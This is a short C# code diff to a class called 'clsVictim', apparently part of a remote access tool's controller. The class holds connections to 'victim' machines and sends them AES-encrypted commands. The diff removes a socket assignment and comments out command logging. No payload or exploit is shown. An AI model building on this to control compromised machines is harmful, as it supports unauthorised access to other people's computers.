@@ -75,7 +75,6 @@ public class clsVictim
         m_listener = listener;
 
         string[] split = socket.RemoteEndPoint.ToString().Split(':');
-        this.socket = socket;
         r_addr = split[0];
         r_port = int.Parse(split[1]);
         ID = "[NOT YET]";
@@ -144,8 +143,10 @@ public class clsVictim
             string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
             Send(Command, Param, enc_data);
 
+            /*
             if (Command == 2 && Param != 1)
                 clsStore.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
+            */
         }).Start();
     }
     public void SendCommand(string command)
